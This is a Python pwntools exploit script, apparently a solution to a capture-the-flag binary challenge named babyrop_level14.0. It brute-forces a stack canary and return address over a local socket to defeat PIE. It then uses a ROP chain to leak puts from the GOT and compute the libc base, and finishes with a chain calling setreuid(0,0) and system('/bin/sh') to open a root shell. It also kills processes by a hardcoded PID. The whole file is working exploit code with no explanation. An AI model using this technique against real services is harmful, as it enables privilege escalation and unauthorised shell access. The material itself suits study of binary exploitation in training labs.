import psutil
from pwn import *
BINARY = "/challenge/babyrop_level14.0"
context.arch = 'amd64'

def find_canary(buf:bytes):
    p = remote('127.0.0.1', 1337)
    p.send(buf)
    msg=b""
    while True:
        msg += p.recvall()
        if b"smashing" in msg:
            p.close()
            return False
        elif b"Goodbye!" in msg:
            p.close()
            return True
    
    

buf = b"A" * 0x58 # not including canary
canary = b"\x00"
# 容易暴力不出来
while True: # 7 bytes left for canary
    for i in range(256):
        canary_tmp = canary + p8(i)
        if find_canary(buf + canary_tmp):
            canary = canary_tmp
            break
    if len(canary) == 8:
            break

print("detect canary = "+hex(int.from_bytes(canary, "little")))
rbp = b"\x00"*8


def process_is_exit():
    pid = 118
    parent_proc = psutil.Process(pid)
    child_procs = parent_proc.children(recursive=True)

    if (len(child_procs) > 0):
        os.kill(child_procs[0].pid, 9)


def find_start(buf:bytes):
    p = remote('127.0.0.1', 1337)
    p.send(buf)
    msg = b""
    while True:
        try:
            msg_tmp = p.recv(timeout=1)
        except:
            msg_tmp = b""
        msg += msg_tmp
        if len(msg_tmp) == 0:
            break
    process_is_exit()

    p.close()

    if b"Welcome" in msg:
        return True
    return False


start_addr = b"\x20"

for i in range(16):
    start_addr_tmp = start_addr + p8(i*16 + 3)
    if find_start(buf + canary + rbp + start_addr_tmp):
        start_addr = start_addr_tmp
        break
        
    # got 2 bytes, 4 bytes left to brute force
for _ in range(4):
    for i in range(0,256):
        start_addr_tmp = start_addr + p8(i)
        if find_start(buf + canary + rbp + start_addr_tmp):
            start_addr = start_addr_tmp
            break
start_addr += b"\x00\x00"
print("detect start = " + hex(int.from_bytes(start_addr, "little")))

binary = ELF(BINARY)
start_addr = int.from_bytes(start_addr, "little")
binary_base = start_addr - binary.sym['_start']
binary.address = binary_base
rop = ROP(binary)
pop_rdi = rop.rdi.address
puts_plt = binary.plt.puts
puts_got = binary.got.puts

rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start_addr)
payload = buf + canary + rbp + rop.chain()
p = remote("127.0.0.1", 1337)
p.send(payload)
all = p.recvuntil(b"Leaving!\n")
puts_addr = unpack(p.recvuntil(b"\n")[:-1], 'all')


# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
ret = rop.ret.address
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
payload = buf + canary + rbp + rop.chain()

process_is_exit()
p = connect("127.0.0.1", 1337)
p.send(payload)

p.interactive()